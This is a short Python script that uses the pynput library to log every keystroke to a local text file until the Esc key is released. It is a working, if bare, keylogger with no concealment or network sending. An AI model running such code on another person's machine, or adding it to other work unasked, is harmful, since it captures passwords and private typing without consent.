from pynput import keyboard

log_file = "key_log.txt"

def on_press(key):
    try:
        key_log = f'{key.char}'
    except AttributeError:
        key_log = f'{key}'

    with open(log_file, 'a') as f:
        f.write(key_log + '\n')

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

